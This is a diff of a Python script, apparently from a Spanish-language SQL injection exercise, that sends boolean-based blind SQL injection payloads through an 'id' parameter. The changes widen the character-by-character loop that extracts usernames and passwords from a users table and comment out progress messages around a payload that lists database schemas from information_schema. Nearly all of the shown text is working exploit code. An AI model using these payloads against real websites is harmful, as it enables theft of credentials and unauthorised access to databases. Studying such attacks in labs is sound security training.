@@ -2449,7 +2449,7 @@ def makeSQLI():
     p2 = log.progress("Datos extraídos")
     extracted_info = ""
 
-    for position in range(1,50):
+    for position in range(1,250):
         for character in range(33,126):
             sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id = 1)=%d)" % (position, character)
 
@@ -2488,8 +2488,9 @@ characters = string.printable
 
 def makeSQLI():
 
-    p1 = log.progress("Fuerza bruta")
-    p1.status("Iniciando proceso de fuerza bruta")
+    # Al ejecutar el string para este ejercio p1 no me deja ver las bd
+    #p1 = log.progress("Fuerza bruta")
+    #p1.status("Iniciando proceso de fuerza bruta")
     time.sleep(3)
 
     p2 = log.progress("Datos extraídos")
@@ -2499,7 +2500,7 @@ def makeSQLI():
         for character in range(33,126):
             sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)" % (position, character)
 
-            p1.status(sqli_url)
+            #p1.status(sqli_url)
 
             r = requests.get(sqli_url)
 
